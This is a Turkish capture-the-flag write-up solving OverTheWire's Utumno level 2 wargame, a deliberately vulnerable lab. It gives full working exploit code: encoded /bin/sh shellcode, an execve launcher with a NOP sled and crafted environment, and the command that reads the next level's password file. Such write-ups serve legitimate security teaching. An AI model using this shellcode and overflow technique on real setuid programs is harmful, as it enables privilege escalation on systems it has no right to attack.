# OverTheWire — Utumno Level 2 Çözümü (utumno2 → utumno3)

> Hedef: `utumno2` kullanıcısından `utumno3` kullanıcısının şifresini elde etmek.
> Teknik: **klasik stack buffer overflow** (canary yok) + **executable stack** üzerinde
> NOP sled + shellcode; `argc` kısıtını aşmak için `execve` ile crafted `argv`/`envp`.

---

## 1. Bağlantı

```bash
ssh utumno2@utumno.labs.overthewire.org -p 2227
# şifre: ........   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno2
# -r-sr-x--- 1 utumno3 utumno2 12568 utumno2   <-- SUID utumno3, grup utumno2 = OKUNABİLİR
file /utumno/utumno2
# setuid ELF 32-bit, dynamically linked, with debug_info, not stripped
```

### strings — kritik ipuçları
```bash
strings /utumno/utumno2
```
- `strcpy`, `puts`, `exit`, `buffer`, `argv`, `argc`
- Derleme bayrakları: **`-fno-stack-protector`** → **stack canary YOK!**

Çalıştırma denemeleri:
```bash
/utumno/utumno2            # "Aw.."  exit=1
/utumno/utumno2 AAAA BBBB  # "Aw.."  exit=1
```

### Mitigasyon kontrolü — stack çalıştırılabilir mi?
```bash
readelf -l /utumno/utumno2 | grep -A1 GNU_STACK
# GNU_STACK ... RWE 0x10     <-- R+W+E => STACK EXECUTABLE!
```
ASLR de kapalı (giriş banner'ından). Yani: **canary yok + executable stack + ASLR yok**
= shellcode'u stack'e koyup return adresini oraya yönlendirebiliriz.

---

## 3. Statik Analiz — `main`

```bash
objdump -d -M intel /utumno/utumno2 | sed -n '/<main>:/,/^$/p'
```

Sözde kod:
```c
int main(int argc, char **argv) {       // [ebp-0xc] = buffer (12 byte)
    if (argc == 0) goto proceed;
    if (argc != 1) { puts("Aw.."); exit(1); }
    // argc == 1:
    if (argv[0][0] == '\0') goto proceed;   // argv[0] BOŞ string ise geç
    puts("Aw.."); exit(1);
proceed:
    strcpy(buffer, argv[10]);            // argv[10] = *(argv + 0x28)
    return 0;
}
```

**İki önemli nokta:**
1. **`proceed`'e ulaşmak için:** `argc == 0` **VEYA** (`argc == 1` ve `argv[0] == ""`).
   Yani komut satırından normal argüman vererek (argc≥2) ULAŞILAMAZ.
2. **Zafiyet:** `strcpy(buffer[12], argv[10])` — buffer 12 byte, canary yok.
   - buffer: `[ebp-0xc]` → buffer'dan saved-ebp'ye 12 byte, +4 saved ebp = **return adresine offset 16**.
   - Kaynak `argv[10]` = `*(argv + 0x28)` (40 = 10×4).

---

## 4. Saldırı Stratejisi

`argc` kısıtı normal argüman vermeyi engelliyor. Çözüm: hedefi **`execve`** ile,
elle hazırlanmış `argv`/`envp` ile başlatan bir **launcher** yaz.

- `execve(path, argv={NULL}, envp=...)` ile `argc = 0` (teoride) → `proceed`'e geçer.
- `argv[10]` overflow verisinin kaynağı → bunu **`envp`** içine yerleştiririz (kernel stack
  düzeninde argv dizisinden hemen sonra envp gelir).
- Shellcode'u büyük bir **NOP sled** ile başka bir env değişkenine koyarız (stack RWE).
- Overflow payload = `16 bayt dolgu + return_adresi`; return adresi NOP sled'in ortasını
  gösterir → kayar → shellcode → `setreuid` + `execve("/bin/sh")` → **utumno3 shell**.

### Adres nasıl deterministik bulunur?
ASLR kapalı olduğu için env string adresleri sabit. Ama tahmin etmek istemeyiz.
**Hile:** Hedefle **birebir aynı** koşulda (aynı `argc=0` çağrısı, aynı `envp`,
**aynı uzunlukta path** — `"/utumno/utumno2"` = 15 karakter) bir "printer" programını
`execve` edip onun `environ[0]` adresini yazdırırız. ASLR kapalı + execfn uzunluğu eşit
+ envp aynı ⇒ printer'ın `environ[0]` adresi = hedefin `environ[0]` adresi.

> `/tmp/p2A7xK9mLq` (15 karakter) printer için seçildi ki AT_EXECFN string uzunluğu
> `/utumno/utumno2` ile eşleşsin (yoksa env adresleri kayardı).

---

## 5. KRİTİK Bug — Modern Kernel `argc=0`'ı Engelliyor (off-by-one)

İlk deneme `rc=0`, shell yok. Sebep çok öğretici:

> **Linux ≥ 5.18** güvenlik düzeltmesi (commit `dcd46d897adb`, "exec: Force single empty
> string when argv is empty"): `execve` boş `argv` ile çağrılırsa kernel **otomatik olarak
> `argv[0] = ""` ekler** → `argc` **0 değil 1** olur.

Bunu printer'a `argc` yazdırtarak doğruladım: `ARGC=1`.

Bu, `argv[10]`'un hangi `envp` elemanına denk geldiğini **bir kaydırır**:

| Durum | Stack düzeni | `argv[10]` = |
|-------|-------------|--------------|
| `argc=0` (teori) | `[NULL][envp0][envp1]...` | `envp[9]` |
| `argc=1` boş argv0 (gerçek) | `[""][NULL][envp0]...` | `envp[8]` |

İlk payload'ım `envp[9]`'daydı ama gerçekte `argv[10]=envp[8]="AA=AA"` okundu → taşma olmadı,
`main` 0 döndü (`rc=0`). 

**Çözüm (sağlam):** payload'ı hem `envp[8]` hem `envp[9]`'a koy (ikisi de aynı string'e
işaret etsin) → kernel davranışı ne olursa olsun `argv[10]` payload'ı bulur.

---

## 6. Final Exploit

### Shellcode (utumno1'den, null-free + slash-free)
`setreuid(geteuid(),geteuid()); execve("/bin/sh",["/bin/sh",0],0)` — 57 bayt.

### `ex.c` — launcher (find + run modları)
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
unsigned char sc[]={
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,0xb8,0x2e,0x72,0x69,0x01,0x35,0x01,0x01,0x01,0x01,0x50,
 0xb8,0x2e,0x63,0x68,0x6f,0x35,0x01,0x01,0x01,0x01,0x50,0x89,0xe3,
 0x31,0xc0,0x50,0x53,0x89,0xe1,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+64];     // "EGG=" + NOP sled + shellcode
static char payload[24];           // 16*'B' + retaddr
static char *envp[12];
void build(unsigned int ret){
 memcpy(eggenv,"EGG=",4);
 memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc);
 eggenv[4+SLED+sizeof sc]=0;
 memset(payload,'B',16);
 *(unsigned int*)(payload+16)=ret;  // offset 16 = return adresi
 payload[20]=0;
 envp[0]=eggenv;
 for(int i=1;i<=7;i++) envp[i]="AA=AA";
 envp[8]=payload; envp[9]=payload;  // argc=0 VE argc=1 durumlarını da kapsa
 envp[10]=0;
}
int main(int argc,char**argv){
 char *av[]={0};                    // argv = {NULL}
 if(argc>=2 && !strcmp(argv[1],"find")){
   build(0x42424242);
   execve("/tmp/p2A7xK9mLq",av,envp); perror("execve"); return 1;   // 15-char path
 } else if(argc>=3 && !strcmp(argv[1],"run")){
   build(strtoul(argv[2],0,16));
   execve("/utumno/utumno2",av,envp); perror("execve"); return 1;
 }
 return 2;
}
```

### `pr.c` — adres + argc yazdırıcı
```c
#include <stdio.h>
extern char **environ;
int main(int argc,char**argv){
 printf("ARGC=%d ENVADDR=%p\n",argc,(void*)environ[0]);
 return 0;
}
```

### Çalıştırma (otomatik kalibrasyon)
```bash
gcc -m32 -o ex ex.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c

INFO=$(./ex find)                 # ARGC=1 ENVADDR=0xfffef4f6
ENV0=$(echo "$INFO" | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")   # sled ortası -> 0xffff6a2a

echo 'id; cat /etc/utumno_pass/utumno3' | ./ex run "$RET"
```

Çıktı:
```
ARGC=1 ENVADDR=0xfffef4f6
RET=0xffff6a2a
uid=16003(utumno3) gid=16002(utumno2) groups=16002(utumno2)
........
```

> Not: `RET = environ[0] + 4 (EGG= atla) + 30000 (60KB sled'in ortası)`.
> Büyük NOP sled, ±20KB'lik adres belirsizliğini soğurur; null-byte içermeyen bir adres
> seçmek şart (strcpy null'da durur).

---

## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **Canary yok (`-fno-stack-protector`)** | `strcpy` ile saved return adresi doğrudan ezilir (offset 16) |
| **Executable stack (`GNU_STACK RWE`)** | Shellcode stack'te (env var) çalıştırılabilir → ret2stack |
| **`argc` kısıtı** | Normal argüman verilemez → `execve` ile crafted `argv`/`envp` gerekir |
| **argc=0 → argv[10]=envp[k]** | Kernel stack düzeni: argv terminator'dan sonra envp gelir |
| **Linux ≥5.18 boş argv → argc=1** | `execve(argv={NULL})` artık `argv[0]=""` ekler → indeks 1 kayar |
| **Off-by-one savunması** | Payload'ı hem envp[8] hem envp[9]'a koy |
| **Deterministik adres** | ASLR kapalı + eşit-uzunluk execfn + aynı envp → printer ile tam adres |
| **NOP sled** | Büyük sled adres belirsizliğini tolere eder; ret-addr null-free olmalı |

